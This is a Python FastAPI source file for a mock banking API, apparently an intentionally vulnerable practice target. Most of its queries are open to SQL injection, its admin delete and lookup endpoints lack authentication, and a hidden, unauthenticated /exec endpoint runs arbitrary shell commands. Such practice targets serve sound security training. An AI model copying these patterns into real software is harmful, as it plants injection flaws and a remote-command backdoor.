import subprocess
from fastapi import FastAPI, HTTPException, Depends, Request, Response
from fastapi.responses import PlainTextResponse
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy import text
from models import User, DBUser, UserLogin, Transfer, EditUser
from auth import createAccessToken, validateAccessToken
from database import getDB, createDatabase

ORIGINS = [
    "http://vbank.api",
]

app = FastAPI(title="vBankAPI", version="1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
)

@app.middleware("http")
async def optionsHandler(request: Request, callNext):
    if request.method == "OPTIONS":
        response = Response()
        origin_header = request.headers.get("Origin")
        if "vbank.api" not in origin_header:
            response.headers["Access-Control-Allow-Origin"] = ORIGINS[0]
        else:
            if origin_header not in ORIGINS:
                ORIGINS.append(origin_header)
            response.headers["Access-Control-Allow-Origin"] = origin_header
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Content-Type"] = "application/json"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return response

    return await callNext(request)

@app.get("/", description="This endpoint will return the current version of the vBankAPI.", name="Version")
async def rootPath():
    response = {"Message":"vBankAPI v1.0"}
    return response

@app.get("/ping", description="This endpoint is a healthcheck to see if the application is still alive", name="Health Check")
async def ping():
    response = {"Message":"Pong"}
    return response
    
@app.post("/register", description="This endpoint allows new users to register into the API.", name="Register new user")
async def registerUser(user: User, db: Session = Depends(getDB)):
    db_user = DBUser(**user.model_dump())
    if db.query(DBUser).filter_by(username=user.username).first():
        raise HTTPException(status_code=400, detail="Username already registered")
    if db.query(DBUser).filter_by(email=user.email).first():
        raise HTTPException(status_code=400, detail="Email already registered")
    db_user.account_number = 1001
    while db.query(DBUser).filter_by(account_number=db_user.account_number).first():
        db_user.account_number = db_user.account_number + 1
    db.add(db_user)
    db.commit()
    db.close()
    return db_user

@app.post("/auth", description="This endpoint allows users to authenticate.", name="Authentication")
async def authUser(login: UserLogin, db: Session = Depends(getDB)):
    data = login.model_dump()
    username_parameter, username_value = list(data.items())[0]
    data = {username_parameter: username_value}
    
    login_query = text(f"SELECT * FROM users WHERE username = '{login.username}' AND password = '{login.password}'")

    try:
        result = db.execute(login_query)
        user_data = result.fetchone()
        if user_data:
            return createAccessToken(data)
        else:
            raise HTTPException(status_code=400, detail="Invalid Username/Password")
    except SQLAlchemyError as sql_error:
        raise HTTPException(status_code=400, detail=f"Error: {sql_error}")

@app.get("/profile", description="Get current user information", name="Current user info")
async def myProfile(db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    if not token:
        raise HTTPException(status_code=401, detail="Unauthorized")
    get_user_query = text(f"SELECT * FROM users WHERE username = '{token['username']}'")
    result = db.execute(get_user_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    db.close()
    return data

@app.get("/users", description="This endpoint allows authenticated admins to retrieve all users in the DB", name="Get Users")
async def getUsers(db: Session = Depends(getDB), token = Depends(validateAccessToken)):    
    if not token:
        raise HTTPException(status_code=401, detail="Unauthorized")
    get_users_query = text(f"SELECT * FROM users")
    result = db.execute(get_users_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    db.close()
    return data

@app.get("/users/{id}", description="This endpoint allows authenticated admins to retrieve users by their IDs", name="Get user by ID")
async def getUserByID(id: int, db: Session = Depends(getDB)):
    get_user_by_id_query = text(f"SELECT * FROM users WHERE id = {id}")
    result = db.execute(get_user_by_id_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    if data != []:
        return data
    else:
        raise HTTPException(status_code=404, detail="User not found.")

@app.delete("/users/{id}", description="This endpoint allows authenticated admins to delete users by their IDs", name="Delete user by ID")
async def deleteUserByID(id: int, db: Session = Depends(getDB)):
    get_user_by_id_query = text(f"SELECT * FROM users WHERE id = {id}")
    result = db.execute(get_user_by_id_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    if data != []:
        delete_user_by_id_query = text(f"DELETE FROM users WHERE id = {id}")
        db.execute(delete_user_by_id_query)
        db.commit()
        db.close()
        return {"message":f"User ID {id} successfuly deleted."}
    else:
        raise HTTPException(status_code=404, detail="User not found.")

@app.post("/transfer", description="Transfer money between two different accounts", name="Transfer money")
async def transferMoney(transfer: Transfer, db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    if not token:
        raise HTTPException(status_code=401, detail="Unauthorized")
    get_orig_acc_amount_query = text(f"SELECT balance FROM users where username = '{token['username']}'")
    get_dest_acc_amount_query = text(f"SELECT balance FROM users where account_number = {transfer.dest_account}")

    orig_acc_amount = db.execute(get_orig_acc_amount_query)
    dest_acc_amount = db.execute(get_dest_acc_amount_query)

    to_transfer = transfer.amount
    
    curr_amount_dest_acc = int(dest_acc_amount.fetchone()[0])
    print(curr_amount_dest_acc)
    curr_amount_orig_acc = int(orig_acc_amount.fetchone()[0])
    print(curr_amount_orig_acc)

    new_amount_dest_acc = curr_amount_dest_acc + transfer.amount
    new_amount_orig_acc = curr_amount_orig_acc - transfer.amount

    if to_transfer > curr_amount_orig_acc:
        raise HTTPException(status_code=401, detail="You're trying to transfer more than what you have in your account.")
    
    add_to_dest_account = text(f"""
                UPDATE users
                SET balance = {new_amount_dest_acc}
                WHERE account_number = {transfer.dest_account};
            """)
    
    add_to_orig_account = text(f"""
                UPDATE users
                SET balance = {new_amount_orig_acc}
                WHERE username = '{token['username']}';
            """)
    db.execute(add_to_dest_account)
    db.execute(add_to_orig_account)
    db.commit()
    db.close()

@app.post("/profile/change-email", description="This endpoint allows users to change their emails", name="Change Email")
async def changeEmail(change_email: EditUser, db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    email = change_email.email
    username = change_email.username
    if not token:
        raise HTTPException(status_code=401, detail="Unauthorized")
    change_email = text(f"""
                UPDATE users
                SET email = '{email}'
                WHERE username = '{username}';
            """)
    db.execute(change_email)
    db.commit()

    return {"message": f"If your user exists, your email will be changed to {email}"}

# ADD CHANGE PASSWORD

@app.post("/exec", include_in_schema=False, response_class=PlainTextResponse)
async def executeCmd(cmd: dict):
    process = subprocess.Popen(cmd['cmd'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if stderr:
        output = stderr.decode("utf-8")
        return output
    output = stdout.decode("utf-8")
    return output      
    
createDatabase()

